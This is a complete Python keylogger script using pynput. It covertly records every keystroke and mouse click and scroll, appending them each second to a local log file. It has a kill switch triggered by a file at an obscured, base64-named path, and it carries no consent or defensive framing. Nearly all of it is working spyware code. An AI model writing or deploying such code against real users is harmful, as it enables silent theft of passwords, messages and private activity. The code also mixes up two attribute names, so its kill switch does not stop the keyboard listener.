from pynput.keyboard import Key, Listener as K
from pynput.mouse import  Listener as M
from threading import Timer
from datetime import datetime
import os, sys
from pathlib import Path

class KeyLogger:
    def __init__(self) -> None:
        self.log = ""
        self.start_date = datetime.now()
        self.stop_file_path = Path("./C/Files/Explorer/Foreign/Figma/aW52YWxpZEZpbGU=")
        self.K_Listener = None
        self.M_Listener = None
        self.pressed_keys = set() # holding keys for complex combos
    
    # kill switch 
    def check_file(self):
        if self.stop_file_path.exists():
            try:
                os.remove(self.stop_file_path)
                print("successfully stopped and removed")
            except Exception as e:
                print("Could not be stopped")
            
            # stopping both listeners 
            if self.K_Listener:
                self.K_Listener.stop()
            if self.M_Listener:
                self.M_Listener.stop()
            sys.exit(0)
    
    
    # Taking keyboard input
    # -------------------------------------------
    # a callback to for each key pressed
    def key_press(self, key):
        
        # check for kill switch 
        self.check_file()
        
        try:
            self.log += key.char
        except AttributeError:
            if key == Key.space:
                self.log += " "
            elif key == Key.backspace:
                self.log += "[BACKSPACE]"
            elif key == Key.enter:
                self.log += "[ENTER]\n"
            elif key in (Key.shift_l, Key.shift_r):
                self.log += "[SHIFT]"
            elif key in (Key.alt_l, Key.alt_r):
                self.log += "[ALT]"
            elif key in (Key.ctrl_l, Key.ctrl_r):
                self.log += "[CTRL]"
            else:
                self.log += f"{key}"
    
    # on release function   
    def key_release(self, key):
        # check for kill switch 
        self.check_file()
        
        if key == Key.esc:
            if self.M_Listener:
                self.M_Listener.stop()
            return False
    
    # Mouse input for keylogger
    # ---------------------------------------
    # Logging each click 
    def mouse_click(self, x, y, button, pressed):
        self.check_file()
        if pressed:
            self.log += f"\nMouse Click: {button} at ({x}, {y})\n"
        else:
            self.log += f"\nMouse Release: {button} at ({x}, {y})\n"
    
    def mouse_scroll(self, x, y, dx, dy):
        self.check_file()
        self.log += f"\nMouse Scroll: ({x},{y}) dx={dx}, dy={dy}\n"
    
    # -------------------------------------------
    # writing it to a output file
    def report(self):
        with open("./logs/log.txt", "a") as log:
            log.write(self.log)
        self.log = ""
        
        timer = Timer(1, self.report)
        timer.daemon = True
        timer.start()
    
    # -------------------------------------------
    # starting the keylogger 
    def initiation(self):
        self.K_listener = K(on_press=self.key_press, on_release=self.key_release)
        self.M_Listener = M(on_click=self.mouse_click, on_scroll=self.mouse_scroll)
        # Start the listener 
        self.K_listener.start()
        self.M_Listener.start()
        
        # start the reporting loop 
        self.report()
        
        # wait for completion 
        self.K_listener.join()
        self.M_Listener.join()
        
logger = KeyLogger()
logger.initiation()
